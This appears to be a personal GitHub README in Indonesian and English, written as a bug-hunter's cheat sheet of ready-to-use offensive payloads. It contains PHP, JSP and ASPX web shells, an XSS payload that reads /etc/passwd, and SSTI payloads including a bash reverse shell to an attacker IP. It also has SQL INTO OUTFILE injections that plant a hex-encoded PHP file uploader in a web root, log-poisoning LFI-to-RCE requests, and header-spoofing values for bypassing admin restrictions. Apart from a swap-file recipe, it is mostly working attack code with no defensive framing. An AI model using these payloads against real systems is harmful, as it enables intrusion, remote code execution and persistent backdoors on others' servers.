Ini Mantra Se Orang Hacker

This is the Mantra of a Hacker

Stay learn n happy hacking ⚡️

Find Sensitif / Gold / Hoki / Endpoint in JS <br>
![JS](https://skillicons.dev/icons?i=js)
<br>
```$ cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u```<br>
```$ curl -s URL | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u```

<br>

XSS to LFI <br>
```<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>```
<br>
<br>


Code Shell  <br>
PHP
```<?php system($_GET['cmd']); ?>```<br>
JSP
```<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>```<br>
ASPX
```<% @Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>```<br>


SSTI <br>
```${7*7} {{7*7}} {7*7} {{7 * '7'}}```
```{{ request.application.globals.builtins.import('os').popen('id').read() }}```<br>
```{{ self.__init__.__globals__.__builtins__ }}```<br>
```{{ request.application.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"').read() }}```


FFUF <br>
Install
https://github.com/ffuf/ffuf <br>
Wordlist https://github.com/danielmiessler/SecLists <br>
```$ ffuf -u URL/PATH -w alive.txt:URL -w SecLists/Discovery/Web-Content/big.txt:PATH -H "User-Agent: Mozilla/5.0 (Linux; Android 15; 25053PC47G Build/AQ3A.250107.001)..."```


Dirsearch <br>
```cat priv.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 -w /root/ffuf/wordlist-2025.txt --random-agent -f --threads 50 -t 10 --exclude-sizes 0B -o dir-results-privat.txt```<br>
```cat 403_sub.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,conf,csv,html,unc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json --random-agent -f --threads 50 -t 10 --exclude-sizes 0B -o dir.txt```


Routes / Endpoint <br>
```{domain}/application/config/routes.php```


Swap RAM <br>
```sudo fallocate -l 10G /swapfile ```<br>
```sudo chmod 600 /swapfile ```<br>
```sudo mkswap /swapfile ```<br>
```sudo swapon /swapfile ```<br>
```echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab ```<br>


Content-Type <br>
```𝗺𝘂𝗹𝘁𝗶𝗽𝗮𝗿𝘁/𝗳𝗼𝗿𝗺-𝗱𝗮𝘁𝗮```<br>
```a𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻/𝘅-𝘄𝘄𝘄-𝗳𝗼𝗿𝗺-𝘂𝗿𝗹𝗲𝗻𝗰𝗼𝗱𝗲𝗱```<br>
```a𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻/json```


Header Injection <br>
```X-Original-URL: /admin  ```<br>
```X-Rewrite-URL: /admin  ```<br>
```X-Custom-IP-Authorization: 127.0.0.1  ```<br>
```X-Forwarded-For: 127.0.0.1  ```<br>
```X-Remote-IP: 127.0.0.1  ```<br>
```X-Originating-IP: 127.0.0.1  ```<br>
```X-Remote-Addr: 127.0.0.1  ```<br>
```X-Client-IP: 127.0.0.1  ```<br>
```True-Client-IP: 127.0.0.1  ```<br>
```Forwarded: for=127.0.0.1```<br>
```X-Api-Key: {KEY}```<br>
```Host: host.com```<br>
```Api-Key: {KEY}```<br>

INTO OUTFILE <br>
```
SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE '/var/www/html/jb/public/.uploader.php'
```

SQLI IOF <br>
```
union select 1,2,0x3c3f706870206563686f202755706c6f616465723c62723e273b6563686f20273c62723e273b6563686f20273c666f726d20616374696f6e3d2222206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e273b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2255706c6f6164223e3c2f666f726d3e273b69662820245f504f53545b275f75706c275d203d3d202255706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d656c7365207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d7d3f3e,4,5 into outfile '/var/www/html/index.php'
```

LFI to RCE <br>
```
GET / HTTP/1.1
Host: target.site
User-Agent: <?php system($_GET['cmd']); ?>
```

```
http://target.site/index.php?page=../../../../var/log/apache2/access.log&cmd=id
```


## 🔗 Contact

[![Telegram](https://img.shields.io/badge/Telegram-0088cc?style=flat-square&logo=telegram&logoColor=ffffff)](https://t.me/GeneralHeroID)



## ⚡ Skill


![Bug Hunting](https://img.shields.io/badge/Bug%20Hunting-IDOR%20%7C%20BAC%20%7C%20XSS%20%7C%20SQLI%20%7C%20LFI%20%7C%20RCE%20%7C%20ATO%20%7C%20PRIVESC%20%7C%20CSRF%20%7C%20SSTI-ff0000?style=flat-square&logo=bug&logoColor=ffffff)





## 🙏 Thanks

We appreciate every contribution 💖

![x](https://img.shields.io/badge/|fffuf|intigriti|chess|jee|numb|meta4sec|shadowserver|anonymous|blackhat|haxor|sojalsec|maurosoria|sohai|irwanjugabro|supermancyber|amr|root.bakar|nur|danielmiessler|defcon|-0d1117?style=flat-square&logo=hackthebox&logoColor=00ffcc)
